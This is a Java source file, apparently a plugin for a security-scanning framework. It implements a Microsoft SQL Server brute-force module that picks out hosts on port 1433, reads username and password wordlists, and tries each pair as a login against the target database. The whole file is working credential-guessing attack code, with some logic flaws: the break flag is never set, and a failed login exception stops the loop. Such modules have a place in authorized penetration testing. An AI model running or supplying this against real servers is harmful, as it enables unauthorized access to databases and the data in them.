package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class MssqlBrute implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "MssqlBrute");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceVersion.toLowerCase().contains("ms-sql") || Integer.valueOf(port) == 1433)
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		try {
			Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver").newInstance();
			String url = "jdbc:sqlserver://"+ip+":"+port+";databasename=msdn";  
		    
		    
		    BufferedReader brUserName = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/mssql-username.txt"))));
			BufferedReader brPassWord = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/mssql-password.txt"))));
			ArrayList<String> userNames = new ArrayList<String>();
			ArrayList<String> passWords = new ArrayList<String>();
			String tmpuserName = "";
			String tmppassWord = "";
			while( (tmpuserName = brUserName.readLine() ) != null)
			{
				userNames.add(tmpuserName);
			}
			while(  (tmppassWord = brPassWord.readLine()) != null )
			{
				passWords.add(tmppassWord);
			}
			
			boolean isBreak = false;
			for(String userName : userNames)
			{
				if (isBreak )
					break;
				for (String passWord : passWords)
				{
					Connection conn = DriverManager.getConnection(url, userName, passWord);
					if(conn !=null)
						success = true;
				}
			}
		} catch (InstantiationException | IllegalAccessException | ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}  
		return success;
	}

}
